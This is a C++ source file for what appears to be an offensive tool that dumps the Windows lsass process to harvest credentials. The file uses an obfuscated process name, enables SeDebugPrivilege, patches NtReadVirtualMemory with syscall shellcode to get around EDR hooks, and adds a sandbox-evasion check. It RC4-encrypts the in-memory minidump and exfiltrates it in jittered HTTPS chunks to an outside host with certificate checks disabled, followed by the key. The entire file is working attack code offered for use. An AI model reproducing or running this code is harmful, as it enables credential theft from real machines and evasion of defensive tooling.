// credit
// 
// ired.team - Dumping Lsass without Mimikatz with MiniDumpWriteDump 
// https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass
// 
// Hoang Bui - Bypass EDR’s memory protection, introduction to hooking
// https://medium.com/@fsx30/bypass-edrs-memory-protection-introduction-to-hooking-2efb21acffd6
// 

#define NOMINMAX
#include "catdumper.h"
#include <windows.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <dbghelp.h>
#include <tlhelp32.h>
#include <processsnapshot.h>
#include <iostream>
#include <string>
#include <random>
#include <vector>
#include <chrono>
#include <thread>

#pragma comment (lib, "ntdll")
#pragma comment (lib, "crypt32")
#pragma comment (lib, "winhttp")
#pragma comment (lib, "dbghelp")

// Buffer for saving the minidump
const size_t dumpBufferSize = 1024 * 1024 * 100; // Size of the dump buffer
LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dumpBufferSize);
DWORD bytesRead = 0;

// MiniDump callback for process snapshot
BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	LPVOID destination = 0, source = 0;
	DWORD bufferSize = 0;

	switch (callbackInput->CallbackType)
	{
	case 16:
		callbackOutput->Status = S_FALSE;
		break;

	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;

	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;

		source = callbackInput->Io.Buffer;
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);

		bufferSize = callbackInput->Io.BufferBytes;
		bytesRead += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}

// Error-checking
std::wstring GetLastErrorMessage() {
	DWORD errorCode = GetLastError();
	LPWSTR errorMessage = nullptr;

	FormatMessageW(
		FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		nullptr, errorCode, 0,
		reinterpret_cast<LPWSTR>(&errorMessage), 0, nullptr);

	if (errorMessage != nullptr) {
		std::wstring errorMsg(errorMessage);
		LocalFree(errorMessage); // Free the allocated message buffer
		return errorMsg;
	}
	else {
		return L"Failed to retrieve error message.";
	}
}

// Convert vectors w/ ASCII number values to wstrings with their respective characters.
std::wstring ASCIItoWString(const std::vector<int>& asciiValues) {
	std::wstring wstr;
	for (auto val : asciiValues)
		wstr.push_back(static_cast<wchar_t>(val));
	return wstr;
}

// Convert vectors w/ ASCII number values to strings with their respective characters.
std::string ASCIItoString(const std::vector<int>& asciiValues) {
	std::string str;
	for (int val : asciiValues)
		str += static_cast<char>(val);
	return str;
}

BOOL SetPrivilege(LPCWSTR lpszPrivilege, BOOL bEnablePrivilege) {
	fLookupPrivilegeValueW _LookupPrivilegeValueW = (fLookupPrivilegeValueW)GetProcAddress(LoadLibrary(L"advapi32"), "LookupPrivilegeValueW");
	fNtAdjustPrivilegesToken _NtAdjustPrivilegesToken = (fNtAdjustPrivilegesToken)GetProcAddress(LoadLibrary(L"ntdll"), "NtAdjustPrivilegesToken");

	TOKEN_PRIVILEGES priv = { 0,0,0,0 };
	HANDLE hToken = NULL;
	LUID luid = { 0,0 };
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		if (hToken)
			CloseHandle(hToken);
		return false;
	}
	if (!_LookupPrivilegeValueW(0, lpszPrivilege, &luid)) {
		if (hToken)
			CloseHandle(hToken);
		return false;
	}
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Luid = luid;
	priv.Privileges[0].Attributes = bEnablePrivilege ? SE_PRIVILEGE_ENABLED : SE_PRIVILEGE_REMOVED;
	if (!_NtAdjustPrivilegesToken(hToken, false, &priv, 0, 0, 0)) {
		if (hToken)
			CloseHandle(hToken);
		return false;
	}
	if (hToken)
		CloseHandle(hToken);
	return true;
}

// Get syscall ID for NtReadVirtualMemory
BYTE GetNtRVM() {
	fRtlGetVersion _RtlGetVersion = (fRtlGetVersion)GetProcAddress(LoadLibrary(L"ntdll"), "RtlGetVersion");
	auto osVerInfo = OSVERSIONINFOEXW{ sizeof(OSVERSIONINFOEXW) };
	_RtlGetVersion((POSVERSIONINFOW)&osVerInfo);
	auto version_long = (osVerInfo.dwMajorVersion << 16) | (osVerInfo.dwMinorVersion << 8) | osVerInfo.wServicePackMajor;
	enum supported_versions
	{
		win8 = 0x060200,
		win81 = 0x060300,
		win10 = 0x0A0000,
	};

	//                    7 and Pre-7     2012SP0   2012-R2    8.0     8.1    Windows 10+
	//NtReadVirtualMemory 0x003c 0x003c    0x003d   0x003e    0x003d 0x003e 0x003f 0x003f 

	BYTE syscall_id = 0x3f;								// Anything after Win8.1, probably Win10/Win11/>=Server2016
	if (version_long > win81);							
	else if (version_long < win8)						// Anything before Win8, probably Win7/Vista
		syscall_id = 0x3c;
	else if (version_long == win81)						// Win8.1/Server 2008 R2
		syscall_id = 0x3e;
	else if (version_long == win8)						// Win8/Server 2008 SP1
		syscall_id = 0x3d;

	return syscall_id;

}

// Unhook NtReadVirtualMemory
VOID FreeNtRVM() {
	BYTE syscall = GetNtRVM();

// Prepare shellcode for x86 or x64
#ifdef  _WIN64
	BYTE Shellcode[] =
	{
		0x4C, 0x8B, 0xD1,                               // mov r10, rcx; NtReadVirtualMemory
		0xB8, 0x3c, 0x00, 0x00, 0x00,                   // eax, 3ch
		0x0F, 0x05,                                     // syscall
		0xC3                                            // retn
	};

	Shellcode[4] = syscall;
#else
	BYTE Shellcode[] =
	{
		0xB8, 0x3c, 0x00, 0x00, 0x00,                   // mov eax, 3ch; NtReadVirtualMemory
		0x33, 0xC9,                                     // xor ecx, ecx
		0x8D, 0x54, 0x24, 0x04,                         // lea edx, [esp + arg_0]
		0x64, 0xFF, 0x15, 0xC0, 0x00, 0x00, 0x00,       // call large dword ptr fs : 0C0h
		0x83, 0xC4, 0x04,                               // add esp, 4
		0xC2, 0x14, 0x00                                // retn 14h
	};

	Shellcode[1] = syscall;
#endif

	// Repatching the jmp
	fNtWriteVirtualMemory _NtWriteVirtualMemory = (fNtWriteVirtualMemory)GetProcAddress(LoadLibrary(L"ntdll"), "NtWriteVirtualMemory");
	_NtWriteVirtualMemory(GetCurrentProcess(), NtReadVirtualMemory, Shellcode, sizeof(Shellcode), NULL);
}

// Simple compile-time polymorphism
constexpr unsigned int numRNG() {
	const char* timeStr = __TIME__;
	unsigned int hash = 0;

	for (int i = 0; timeStr[i] != '\0'; ++i)
		hash = 31 * hash + timeStr[i];
	return hash % 10;
}

// Encryption key generator
std::string Keygen(int length) {
	length += 50;
	std::random_device rd;
	std::mt19937 generator(rd());
	std::uniform_int_distribution<int> distribution(std::numeric_limits<char>::min(), std::numeric_limits<char>::max());

	std::string key;
	key.reserve(length);

	char randomChar;
	for (int i = 0; i < length; ++i) {
		do {
			randomChar = static_cast<char>(distribution(generator));
		} while (!isalnum(randomChar));
		key += randomChar;
	}
	return key;
}

// RC4 encryption
void RC4(std::vector<char>& data, const std::string& key) {
	unsigned char S[256];
	unsigned char temp;
	int i, j = 0, t;

	// Initialize S array
	for (i = 0; i < 256; i++)
		S[i] = i;

	// Key-scheduling algorithm (KSA)
	for (i = 0; i < 256; i++) {
		j = (j + S[i] + key[i % key.size()]) % 256;
		std::swap(S[i], S[j]);
	}

	// Encryption
	i = j = 0;
	for (size_t k = 0; k < data.size(); k++) {
		i = (i + 1) % 256;
		j = (j + S[i]) % 256;
		std::swap(S[i], S[j]);
		t = (S[i] + S[j]) % 256;
		data[k] ^= S[t];
	}
}

// Encrypt minidump
std::string EncryptDump(LPVOID dumpBuffer, DWORD dumpBufferSize, const std::string& key) {
	char* buffer = static_cast<char*>(dumpBuffer);
	std::vector<char> data(buffer, buffer + dumpBufferSize);
	RC4(data, key);
	return std::string(data.begin(), data.end());
}

// Encode encrypted data
std::string Base64Encode(const std::string& input) {
	DWORD encodedLength = 0;
	if (!CryptBinaryToStringA(reinterpret_cast<const BYTE*>(input.data()), input.length(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encodedLength))
		return "";

	std::string encoded(encodedLength, '\0');
	if (!CryptBinaryToStringA(reinterpret_cast<const BYTE*>(input.data()), input.length(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &encoded[0], &encodedLength))
		return "";

	encoded.erase(encoded.find('\0'));
	return encoded;
}

// Split encoded data into smaller, easy to exfil chunks
std::vector<std::string> SplitDataIntoChunks(const std::string& data, size_t chunkSize) {
	std::vector<std::string> chunks;
	size_t totalSize = data.size();
	size_t offset = 0;

	while (offset < totalSize) {
		size_t nextChunkSize = std::min(chunkSize, totalSize - offset);
		chunks.push_back(data.substr(offset, nextChunkSize));
		offset += nextChunkSize;
	}

	return chunks;
}

// Perform HTTPS exfiltration
bool SendHTTPSRequest(const std::string& hostname, const std::string& path, const std::string& data, bool isKey = false) {
	HINTERNET hSession = WinHttpOpen(L"curl/8.4.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	HINTERNET hConnect = WinHttpConnect(hSession, std::wstring(hostname.begin(), hostname.end()).c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", std::wstring(path.begin(), path.end()).c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

	DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
	WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));
	
	std::wstring headerStr = isKey ? L"Authorization: Bearer " + std::wstring(data.begin(), data.end()) + L"\r\n" : L"";
	LPCWSTR header = isKey ? headerStr.c_str() : WINHTTP_NO_ADDITIONAL_HEADERS;

	bool result = WinHttpSendRequest(hRequest, header, -1, (LPVOID)data.c_str(), data.size(), data.size(), 0);
	if (result) result = WinHttpReceiveResponse(hRequest, NULL);

	DWORD statusCode = 0;
	DWORD statusCodeSize = sizeof(statusCode);
	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
		WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize,
		WINHTTP_NO_HEADER_INDEX);

	// Clean up
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);

	return result;
}

// Exfil chunks of data over HTTPS
void SendDataInChunks(const std::string& data, const std::string& hostname, const std::string& path) {
	std::random_device rd;
	std::mt19937 gen(rd());

	std::uniform_int_distribution<> sizeDist(2 * 1024 * 1024, 4 * 1024 * 1024); // 2 MB to 4 MB
	std::uniform_int_distribution<> timeDist(1000, 2000); // 1 second to 2 seconds

	size_t offset = 0;
	size_t totalSize = data.size();
	size_t sequenceNumber = 0;

	while (offset < totalSize) {
		size_t chunkSize = std::min<size_t>(sizeDist(gen), totalSize - offset);
        std::string chunk = data.substr(offset, chunkSize);

        if (!SendHTTPSRequest(hostname, path, chunk)) {
            // Handle error
        }

        offset += chunkSize;
        sequenceNumber++;

        int sleepTime = timeDist(gen);
        std::this_thread::sleep_for(std::chrono::milliseconds(sleepTime));
    }
}

int main() {

	// Trick heuristics
	SECURITY_ATTRIBUTES secAttr;
	secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	secAttr.lpSecurityDescriptor = NULL;
	secAttr.bInheritHandle = FALSE;

	if (VirtualAllocExNuma(GetCurrentProcess(), NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0) == NULL) return 1;
	if (VirtualFreeEx(GetCurrentProcess(), VirtualAllocExNuma(GetCurrentProcess(), NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0), 0, MEM_RELEASE) == 0) return 1;

	// Instantiate variables
	DWORD pid = 0;
	HANDLE lsassHandle = NULL;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	LPCWSTR processName = L"";
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	// Get lsass PID
	std::vector<int> exevect = { 108, 115, 97, 115, 115, 46, 101, 120, 101 }; // lsass.exe
	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processName, ASCIItoWString(exevect).c_str()) != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			pid = processEntry.th32ProcessID;
		}
	}

	// Open lsass
	SetPrivilege(L"SeDebugPrivilege", TRUE);
	lsassHandle = OpenProcess(0x000F0000L | 0x00100000L | 0xFFF, 0, pid);
	
	// Unhook NtReadVirtualMemory
	FreeNtRVM();

	// Set up callback for in-memory procedures
	HANDLE snapshotHandle = NULL;
	DWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
	ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	CallbackInfo.CallbackRoutine = &minidumpCallback;
	CallbackInfo.CallbackParam = NULL;
	
	// Take snapshot of process
	PssCaptureSnapshot(lsassHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&snapshotHandle);

	// Dump lsass
	BOOL isDumped = MiniDumpWriteDump(snapshotHandle, pid, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
	std::wstring err = GetLastErrorMessage();

	// Free the snapshot
	PssFreeSnapshot(GetCurrentProcess(), (HPSS)snapshotHandle);

	if (isDumped) {

		// Perform in-memory encryption and exfiltration
		std::string key = Keygen(numRNG());
		std::string data = Base64Encode(EncryptDump(dumpBuffer, bytesRead, key));

		SendDataInChunks(data, "catflask.meowmycks.com", "/upload");
		SendHTTPSRequest("catflask.meowmycks.com", "/upload", key, true);
	}
	else {
		// wtf happened???
		std::wcout << L"Dump failed. " << err << std::endl;
	}

	// Clean-up
	HeapFree(GetProcessHeap(), 0, dumpBuffer);
	return 0;
}
